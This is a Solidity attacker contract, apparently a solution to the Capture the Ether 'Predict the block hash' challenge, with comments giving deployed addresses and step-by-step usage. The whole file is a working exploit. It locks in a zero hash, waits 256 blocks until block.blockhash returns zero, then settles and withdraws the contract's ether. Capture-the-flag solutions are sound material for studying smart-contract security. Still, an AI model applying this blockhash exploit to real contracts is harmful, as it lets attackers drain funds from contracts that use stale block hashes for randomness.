// Challenge contract deployed at address: 0xFA01eec3A6417373B4Ed5E3C4c36dC7Dea3f286F
// Attacker contract: 0x884A5a19A1B8d73f72CD6052C6878B317be969da
// 1 - Deploy the Contract
// 2 - Call guess() with 1 Ether and the answer will be set to 0
// 3 - Call settle() after waiting for 256 blocks - 12726716
// 4 - Once settle is successful call withdraw()

pragma solidity ^0.4.21;

interface IPredictTheBlockHashChallenge {
    function lockInGuess(bytes32 hash) external payable;

    function isComplete() external view returns (bool);

    function settle() external;
}

contract PredictTheBlockHashChallengeAttacker {
    IPredictTheBlockHashChallenge public challenge;

    function PredictTheBlockHashChallengeAttacker(address challengeAddress)
        public
        payable
    {
        challenge = IPredictTheBlockHashChallenge(challengeAddress);
    }

    function guess() external payable {
        bytes32 answer = block.blockhash(block.number + 1);
        challenge.lockInGuess.value(msg.value)(answer); // This sets the hash to 0
    }

    function settle() external {
        challenge.settle(); // Shall only work after 256 blocks
    }

    function withdraw() external {
        require(challenge.isComplete());
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
